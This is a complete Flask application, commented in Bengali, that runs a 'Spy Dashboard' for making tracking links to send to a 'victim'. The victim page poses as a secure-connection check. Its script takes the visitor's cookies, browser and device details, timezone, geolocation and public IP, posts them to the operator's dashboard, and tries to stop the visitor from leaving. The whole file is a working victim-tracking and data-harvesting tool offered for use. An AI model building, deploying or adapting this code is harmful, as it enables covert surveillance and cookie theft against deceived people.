# -*- coding: utf-8 -*-
import os
import uuid
from datetime import datetime
from flask import Flask, request, render_template_string, redirect, session

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'force-fixed-key-2025')

reports = {}

# ড্যাশবোর্ড HTML (সহজ)
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Spy Dashboard</title>
    <meta charset="UTF-8">
    <style>
        body{background:#0a0f1e;font-family:monospace;padding:20px;color:#0f0;}
        .card{background:#111;border-radius:15px;padding:20px;margin-bottom:20px;border:1px solid #4affff;}
        input,button{padding:10px;margin:5px;border-radius:8px;border:none;}
        input{background:#000;color:#0f0;border:1px solid #4affff;width:70%;}
        button{background:#4affff;color:#000;cursor:pointer;}
        pre{background:#000;padding:10px;border-radius:8px;overflow:auto;}
        .data-item{border-left:3px solid #ff3366;margin:10px 0;padding:10px;background:#0f1422;}
    </style>
</head>
<body>
<div class="card">
    <h2>📡 SPY DASHBOARD</h2>
    <p><strong>Your persistent UID:</strong> {{ uid }}</p>
    <div>
        <input type="text" id="link" value="{{ link }}" readonly style="width:70%;">
        <button onclick="copyLink()">Copy Link</button>
    </div>
    <form method="post" action="/new_uid" style="display:inline;">
        <button type="submit" style="background:#ff3366;">Generate New Link (New UID)</button>
    </form>
    <p>⚠️ Send current link to victim. Data automatically appears here.</p>
</div>
<div class="card">
    <h3>📥 Received Data (UID: {{ uid }})</h3>
    <button onclick="location.reload()">Refresh</button>
    <div id="data">
        {% if reports[uid] and reports[uid].data %}
            {% for item in reports[uid].data|reverse %}
                <div class="data-item">
                    <small>{{ item.time }}</small>
                    <pre>{{ item.data | tojson(indent=2) }}</pre>
                </div>
            {% endfor %}
        {% else %}
            <p>⏳ No data yet. Send the link to victim.</p>
        {% endif %}
    </div>
</div>
<script>
    function copyLink() {
        let inp = document.getElementById('link');
        inp.select();
        navigator.clipboard.writeText(inp.value);
        alert('Link copied!');
    }
    setInterval(() => location.reload(), 5000);
</script>
</body>
</html>
"""

# ভিকটিম পেজ (ডিবাগ সংস্করণ, যেখানে অ্যালার্ট দেখাবে এবং কনসোল লগ করবে)
SPY_PAGE_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>body{background:#000;color:#0f0;text-align:center;padding-top:20%;font-family:monospace;}</style>
</head>
<body>
    <h2>🔐 Secure connection established</h2>
    <p>Please wait while we verify your device...</p>
    <script>
        (function() {
            // স্পষ্টভাবে server URL বের করা
            var server = window.location.origin;
            var uid = "{{ uid }}";
            console.log("Spy page loaded. Origin:", server, "UID:", uid);
            alert("Debug: Page loaded. Sending data to " + server);
            
            function sendData(data) {
                var url = server + '/api/report/' + uid;
                console.log("Attempting to send to:", url, data);
                fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                })
                .then(function(response) {
                    console.log("Response status:", response.status);
                    if (response.ok) {
                        alert("Data sent successfully!");
                    } else {
                        alert("Server returned status: " + response.status);
                    }
                })
                .catch(function(error) {
                    console.error("Fetch error:", error);
                    alert("Fetch failed: " + error.message);
                });
            }
            
            // পাঠানোর তথ্য
            var info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: document.cookie,
                localStorageSize: localStorage.length,
                url: window.location.href,
                timestamp: new Date().toISOString()
            };
            sendData(info);
            
            // লোকেশন (অনুমতি সাপেক্ষে)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        sendData({ location: { lat: pos.coords.latitude, lon: pos.coords.longitude } });
                    },
                    function(err) { console.log("Geolocation error", err); }
                );
            }
            
            // আইপি
            fetch('https://api.ipify.org?format=json')
                .then(function(r) { return r.json(); })
                .then(function(ipData) { sendData({ ip: ipData.ip }); })
                .catch(function(e) { console.log("IP fetch failed", e); });
                
            // পেজ বন্ধ করতে না দেওয়ার কৌশল
            window.onbeforeunload = function() { return true; };
        })();
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return redirect('/dashboard')

@app.route('/dashboard')
def dashboard():
    if 'uid' not in session:
        session['uid'] = str(uuid.uuid4())[:8]
        reports[session['uid']] = {'data': []}
    uid = session['uid']
    if uid not in reports:
        reports[uid] = {'data': []}
    # লিংক তৈরি
    link = request.host_url.rstrip('/') + '/spy/' + uid
    return render_template_string(DASHBOARD_HTML, link=link, uid=uid, reports=reports)

@app.route('/new_uid', methods=['POST'])
def new_uid():
    session['uid'] = str(uuid.uuid4())[:8]
    reports[session['uid']] = {'data': []}
    return redirect('/dashboard')

@app.route('/spy/<uid>')
def spy(uid):
    if uid not in reports:
        reports[uid] = {'data': []}
    return render_template_string(SPY_PAGE_HTML, uid=uid)

@app.route('/api/report/<uid>', methods=['POST'])
def report(uid):
    if uid not in reports:
        reports[uid] = {'data': []}
    try:
        data = request.get_json()
        print(f"[LOG] Data for {uid}: {data}")  # রেন্ডার লগে দেখাবে
    except Exception as e:
        data = {"error": str(e)}
    reports[uid]['data'].append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'data': data
    })
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)